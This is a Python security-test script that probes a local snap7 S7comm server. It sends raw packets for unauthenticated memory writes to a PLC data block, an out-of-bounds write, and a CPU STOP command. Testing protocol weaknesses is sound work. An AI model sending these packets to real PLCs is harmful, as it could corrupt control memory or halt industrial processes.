#!/usr/bin/env python3
"""
S7comm Protocol Test - Phase 3: Memory Write & Direct Control Abuse
--------------------------------------------------------------------
Objective: Probe the server's write access controls and CPU control
interface without any authentication or authorization.

Each test opens a fresh TCP/S7 session independently — this prevents
a server-side connection drop on one test from poisoning the others.
"""

import socket
import struct
import time

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

console = Console()

TARGET_IP   = "127.0.0.1"
TARGET_PORT = 102
SRC_TSAP    = 0x0100
DST_TSAP    = 0x0102  # Rack 0, Slot 2

# --- S7comm protocol lookup tables -----------------------------------------

ROSCTR_TYPES = {
    0x01: "Job (request)",
    0x02: "Ack (no data)",
    0x03: "Ack-Data (response with data)",
    0x07: "Userdata",
}

S7_RETURN_CODES = {
    0xFF: ("Success",                          "green"),
    0x01: ("Hardware Error",                   "red"),
    0x03: ("Access Denied",                    "red"),
    0x04: ("Address Out of Range / Invalid Area", "bold yellow"),
    0x05: ("Address Out of Range (Data Type)", "yellow"),
    0x06: ("Data Type Not Supported",          "yellow"),
    0x0A: ("Object Does Not Exist",            "bold red"),
}

# --- Protocol builders ------------------------------------------------------

def build_cotp_cr(src_tsap: int, dst_tsap: int) -> bytes:
    tpkt = bytes([0x03, 0x00, 0x00, 0x16])
    cotp = bytes([
        0x11, 0xE0, 0x00, 0x00, 0x00, 0x01, 0x00,
        0xC1, 0x02, (src_tsap >> 8) & 0xFF, src_tsap & 0xFF,
        0xC2, 0x02, (dst_tsap >> 8) & 0xFF, dst_tsap & 0xFF,
        0xC0, 0x01, 0x0A,
    ])
    return tpkt + cotp


def build_s7_setup_comm(pdu_ref: int = 1) -> bytes:
    s7_pdu = bytes([
        0x32, 0x01, 0x00, 0x00,
        (pdu_ref >> 8) & 0xFF, pdu_ref & 0xFF,
        0x00, 0x08, 0x00, 0x00,
        0xF0, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0xE0,
    ])
    tpkt_len = 4 + 3 + len(s7_pdu)
    tpkt = bytes([0x03, 0x00, (tpkt_len >> 8) & 0xFF, tpkt_len & 0xFF])
    cotp = bytes([0x02, 0xF0, 0x80])
    return tpkt + cotp + s7_pdu


def build_write_var_packet(db_num: int, byte_offset: int, payload: bytes, pdu_ref: int) -> bytes:
    """
    Constructs an S7 WriteVar (Function 0x05) PDU.

    Any-Pointer item layout (12 bytes total):
      [0]    0x12  Variable Specification
      [1]    0x0A  Address Specification Length (10 bytes follow)
      [2]    0x10  Syntax ID: S7-Any pointer
      [3]    0x02  Transport Size: BYTE
      [4:6]  H     Count (bytes requested)
      [6:8]  H     DB Number           ← 2 bytes (H), not 1 (B)
      [8]    0x84  Area ID: Data Block
      [9:12] ---   24-bit bit-offset address

    Format ">BBBBHHB" = 1+1+1+1+2+2+1 = 9 bytes + 3-byte address = 12 bytes.
    The original bug used ">BBBBHBB" (DB number as 1 byte), producing an
    11-byte item that misaligned the area ID and address fields.
    """
    bit_address = (byte_offset << 3) & 0x00FFFFFF

    any_pointer  = struct.pack(
        ">BBBBHHB",
        0x12, 0x0A,    # Variable Spec + Addr Spec Length
        0x10,          # Syntax ID: S7-Any
        0x02,          # Transport Size: BYTE
        len(payload),  # Count
        db_num,        # DB Number (2 bytes)
        0x84,          # Area ID: DB
    )
    any_pointer += struct.pack(">I", bit_address)[1:]  # 3-byte address

    # Parameter: function 0x05 + item count 0x01 + 12-byte any_pointer = 14 bytes
    param = bytes([0x05, 0x01]) + any_pointer

    # Data item: placeholder return code (0x00), transport size byte-counted (0x04),
    # bit-length as uint16, then the raw payload
    bit_len = len(payload) * 8
    data = struct.pack(">BBH", 0x00, 0x04, bit_len) + payload
    if len(data) % 2 != 0:
        data += b"\x00"  # S7 word-boundary alignment padding

    # S7 Job header: derive lengths from actual built sections (no hardcoding)
    s7_header = struct.pack(">BBHHHH",
        0x32, 0x01,   # Protocol ID, ROSCTR: Job
        0x0000,       # Redundancy ID
        pdu_ref,      # PDU Reference
        len(param),   # Parameter Length
        len(data),    # Data Length
    )
    pdu = s7_header + param + data
    tpkt_len = 4 + 3 + len(pdu)
    return bytes([
        0x03, 0x00, (tpkt_len >> 8) & 0xFF, tpkt_len & 0xFF,
        0x02, 0xF0, 0x80,
    ]) + pdu

# --- Session management -----------------------------------------------------

def open_session() -> socket.socket:
    """
    Opens a fresh TCP connection and negotiates an S7 session.
    Returns the connected socket on success; raises on failure.
    Each test calls this independently so a dropped connection on
    one test does not affect the others.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3.0)
    sock.connect((TARGET_IP, TARGET_PORT))

    # COTP Connection Request
    sock.sendall(build_cotp_cr(SRC_TSAP, DST_TSAP))
    resp = sock.recv(1024)
    if not resp or len(resp) < 6 or resp[5] != 0xD0:
        raise RuntimeError("COTP handshake failed (expected CC 0xD0)")

    # S7 Setup Communication
    sock.sendall(build_s7_setup_comm(pdu_ref=1))
    resp = sock.recv(1024)
    if not resp or len(resp) < 12 or resp[8] != 0x03:
        raise RuntimeError("S7 PDU negotiation failed (expected Ack-Data 0x03)")

    negotiated_pdu = struct.unpack(">H", resp[25:27])[0] if len(resp) >= 27 else 480
    console.print(
        f"  [dim][+][/dim] Session ready. "
        f"ROSCTR=[bold green]0x03 (Ack-Data)[/bold green]  "
        f"PDU=[cyan]{negotiated_pdu} bytes[/cyan]"
    )
    return sock


def parse_write_response(resp: bytes):
    """
    Parses a WriteVar Ack-Data response.
    Returns (return_code: int, description: str, style: str).

    S7 payload starts at resp[7:] (after 4-byte TPKT + 3-byte COTP DT).
    Ack-Data (ROSCTR 0x03) header is 12 bytes — 2 bytes longer than a
    Job header because it carries error_class and error_code fields.
    The data section starts at header_len + param_len.
    """
    if not resp or len(resp) < 18:
        return 0x00, "Response too short to parse", "bold red"

    s7         = resp[7:]
    rosctr     = s7[1]
    param_len  = struct.unpack(">H", s7[6:8])[0]
    header_len = 12 if rosctr == 0x03 else 10
    data_start = header_len + param_len

    if len(s7) <= data_start:
        return 0x00, "Data section missing from response", "bold red"

    rc = s7[data_start]
    desc, style = S7_RETURN_CODES.get(rc, ("Unknown Return Code", "bold red"))
    return rc, desc, style

# --- Test cases -------------------------------------------------------------

def run_test_1():
    """
    Test 1: WriteVar (0x05) against DB3 (a registered, backed area).
    Payload: 16 x 0xFF bytes starting at byte offset 0.
    Expected return code: 0xFF (Success) — the server has no write protection.
    """
    console.print(Panel(
        "[bold yellow]Test 1: Unauthenticated Memory Write (WriteVar 0x05)[/bold yellow]\n"
        "[dim]Target: DB3, byte offset 0 | Payload: 16 × 0xFF[/dim]",
        expand=False,
    ))

    try:
        sock = open_session()
        payload = b"\xFF" * 16

        t = Table(box=None)
        t.add_column("Field", style="dim cyan")
        t.add_column("Value", style="white")
        t.add_row("Function",    "0x05 -- WriteVar")
        t.add_row("Target Area", "DB3 (Data Block)")
        t.add_row("Byte Offset", "0")
        t.add_row("Payload",     f"{payload.hex().upper()} ({len(payload)} bytes)")
        console.print(t)
        console.print()

        packet = build_write_var_packet(db_num=3, byte_offset=0, payload=payload, pdu_ref=2)
        sock.sendall(packet)
        resp = sock.recv(1024)

        rc, desc, style = parse_write_response(resp)
        console.print(f"  Return Code : [{style}]0x{rc:02X} -- {desc}[/{style}]")

        if rc == 0xFF:
            console.print(
                "  [bold green][!] Write accepted with no authentication.[/bold green] "
                "DB3[0..15] overwritten with 0xFF."
            )
        else:
            console.print(f"  [dim]Write rejected by server.[/dim]")

        sock.close()

    except Exception as e:
        console.print(f"  [bold red][!] Test 1 error: {e}[/bold red]")


def run_test_2():
    """
    Test 2: Out-of-bounds WriteVar — byte offset 65000 against DB3.
    DB3 is 1024 bytes; offset 65000 is far outside that range.
    Expected return code: 0x04 (Address Out of Range / Invalid Area).
    """
    console.print(Panel(
        "[bold yellow]Test 2: Out-of-Bounds Write (WriteVar 0x05)[/bold yellow]\n"
        "[dim]Target: DB3, byte offset 65000 | DB3 size: 1024 bytes[/dim]",
        expand=False,
    ))

    try:
        sock = open_session()
        payload = b"\x42" * 4

        t = Table(box=None)
        t.add_column("Field", style="dim cyan")
        t.add_column("Value", style="white")
        t.add_row("Function",      "0x05 -- WriteVar")
        t.add_row("Target Area",   "DB3 (registered size: 1024 bytes)")
        t.add_row("Byte Offset",   "65000 (0xFDE8) — beyond DB3 boundary")
        t.add_row("Payload",       f"{payload.hex().upper()} ({len(payload)} bytes)")
        console.print(t)
        console.print()

        packet = build_write_var_packet(db_num=3, byte_offset=65000, payload=payload, pdu_ref=3)
        sock.sendall(packet)
        resp = sock.recv(1024)

        rc, desc, style = parse_write_response(resp)
        console.print(f"  Return Code : [{style}]0x{rc:02X} -- {desc}[/{style}]")

        if rc == 0x04:
            console.print("  [bold green][!] Server correctly rejected the OOB address.[/bold green]")
        elif rc == 0xFF:
            console.print("  [bold red][!] Server accepted a write beyond its registered buffer.[/bold red]")

        sock.close()

    except Exception as e:
        console.print(f"  [bold red][!] Test 2 error: {e}[/bold red]")


def run_test_3():
    """
    Test 3: CPU STOP via S7 UserData (ROSCTR 0x07), function group CPU control.

    On a real S7-300/400 target this PDU would attempt to halt the PLC's
    execution cycle. The snap7 demo server does not implement CPU control
    UserData functions, so the expected behaviour is the server closing
    the connection on receipt — a broken pipe is the anticipated result.
    The test documents that behaviour rather than treating it as a script error.
    """
    console.print(Panel(
        "[bold yellow]Test 3: CPU State Control -- PLC STOP (UserData ROSCTR 0x07)[/bold yellow]\n"
        "[dim]Expected on snap7 demo server: connection dropped (function not implemented)[/dim]",
        expand=False,
    ))

    try:
        sock = open_session()

        # S7 UserData parameter block for CPU STOP:
        #   head    : 00 01 12
        #   length  : 04 (4 bytes follow in the header)
        #   method  : 11 (request)
        #   sub-fn  : 47 (CPU control)
        #   seq/res : 00 00
        #   data    : "_STOP" (service identifier)
        param = bytes([0x00, 0x01, 0x12, 0x04, 0x11, 0x47, 0x00, 0x00]) + b"_STOP"

        s7_header = struct.pack(
            ">BBHHHH",
            0x32, 0x07,   # Protocol ID, ROSCTR: UserData
            0x0000,       # Redundancy ID
            4,            # PDU Reference
            len(param),   # Parameter Length
            0x0000,       # Data Length
        )
        pdu = s7_header + param
        tpkt_len = 4 + 3 + len(pdu)
        packet = bytes([
            0x03, 0x00, (tpkt_len >> 8) & 0xFF, tpkt_len & 0xFF,
            0x02, 0xF0, 0x80,
        ]) + pdu

        console.print("  [*] Sending UserData CPU STOP request (ROSCTR=0x07, sub-fn=0x47)...")

        sock.sendall(packet)

        try:
            resp = sock.recv(1024)
            if resp:
                rosctr = resp[8] if len(resp) > 8 else 0x00
                console.print(
                    f"  [+] Server responded ({len(resp)} bytes). "
                    f"ROSCTR: [bold]0x{rosctr:02X} -- {ROSCTR_TYPES.get(rosctr, 'Unknown')}[/bold]"
                )
                console.print(f"      Raw (first 32 bytes): {resp[:32].hex().upper()}")
            else:
                console.print("  [dim]Server closed the connection without a response body.[/dim]")
        except socket.timeout:
            console.print("  [dim]No response within timeout window.[/dim]")

        sock.close()

    except Exception as e:
        console.print(f"  [dim][!] Connection terminated: {e}[/dim]")

    console.print(
        "  [bold yellow][!] Observation:[/bold yellow] snap7 demo server does not implement "
        "CPU control UserData functions. On a real S7-300/400 target this packet would attempt "
        "to halt the PLC execution cycle with no authentication required."
    )


# ---------------------------------------------------------------------------

def main():
    console.print(Panel(
        "[bold cyan]S7comm Protocol Test -- Phase 3: Memory Write & Control Abuse[/bold cyan]\n"
        "[dim]Each test opens a fresh session to prevent state pollution across cases.[/dim]",
        box=box.DOUBLE,
        style="bold white on blue",
    ))

    run_test_1()
    console.print()
    run_test_2()
    console.print()
    run_test_3()


if __name__ == "__main__":
    main()

